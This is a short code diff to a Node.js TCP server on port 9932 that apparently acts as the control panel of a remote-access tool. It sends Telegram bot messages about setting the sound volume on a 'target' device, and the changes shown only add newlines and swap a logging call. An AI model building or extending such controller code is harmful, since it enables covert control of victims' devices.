@@ -894,7 +894,7 @@ const server = net.createServer(async (socket) => {
                         } else if (message.method == "setSoundVolume"){
                             if (message.status == true){
                                 message.shortcut.edit ? await bot.editMessageText(
-                                    build(`🔊 ${sym} volume seted for your target `) + message.device_id + build(`\n🌪 ${sym} volume is ${message.shortcut.volume} now`),
+                                    build(`🔊 ${sym} volume seted for your target `) + message.device_id + build(`\n\n🌪 ${sym} volume is ${message.shortcut.volume} now`),
                                     {
                                         parse_mode: "HTML",
                                         chat_id: message.shortcut.chat_id,
@@ -902,7 +902,7 @@ const server = net.createServer(async (socket) => {
                                     }
                                 ) : await bot.sendMessage(
                                     message.shortcut.chat_id,
-                                    build(`🔊 ${sym} volume seted for your target `) + message.device_id + build(`\n🌪 ${sym} volume is ${message.shortcut.volume} now`),
+                                    build(`🔊 ${sym} volume seted for your target `) + message.device_id + build(`\n\n🌪 ${sym} volume is ${message.shortcut.volume} now`),
                                     {
                                         reply_to_message_id: message.shortcut.message_id
                                     }
@@ -969,5 +969,5 @@ server.listen(9932, "0.0.0.0", () => {
 })
 
 process.on("uncaughtException", async (err) => {
-    console.error("[B] error detected:", err);
+    console.log("[B] error detected:", err);
 })
